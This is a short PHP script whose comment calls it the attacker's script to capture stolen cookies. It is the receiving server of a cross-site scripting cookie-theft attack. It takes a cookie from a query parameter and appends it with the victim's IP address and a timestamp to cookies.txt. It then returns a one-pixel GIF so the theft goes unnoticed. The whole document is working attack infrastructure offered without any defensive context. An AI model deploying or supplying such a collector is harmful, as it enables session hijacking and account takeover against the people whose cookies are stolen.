<?php
// This is the attacker's script to capture stolen cookies.

if (isset($_GET['c'])) {
    $cookie = $_GET['c'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    $logEntry = "[$date] IP: $ip | Cookie: $cookie" . PHP_EOL;
    
    // Save to cookies.txt
    file_put_contents('cookies.txt', $logEntry, FILE_APPEND);
    
    // Redirect or show a fake pixel to avoid suspicion
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
}
?>
